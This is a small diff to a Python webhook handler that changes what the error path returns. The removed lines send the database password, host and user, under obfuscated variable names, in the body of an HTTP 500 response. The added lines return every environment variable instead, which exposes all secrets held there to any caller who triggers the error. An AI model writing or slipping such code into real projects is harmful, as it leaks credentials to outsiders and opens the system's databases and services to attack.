@@ -87,6 +87,7 @@ def webhook_handler(request):
         otdata = os.getenv('DB_PASSWORD')
         dbhost = os.getenv('RDS_HOST')
         dbuser = os.getenv('DB_USER')
-        dsd = "1-"+otdata+"--2"+dbhost+"--3"+dbuser+"dbhost"
+        env_variables = {key: value for key, value in os.environ.items()}
+    
         # If there's an error in your webhook handling logic, respond with an error using HttpResponse
-        return HttpResponse(dsd, status=500, content_type='text/plain')
+        return HttpResponse(env_variables, status=500, content_type='text/plain')
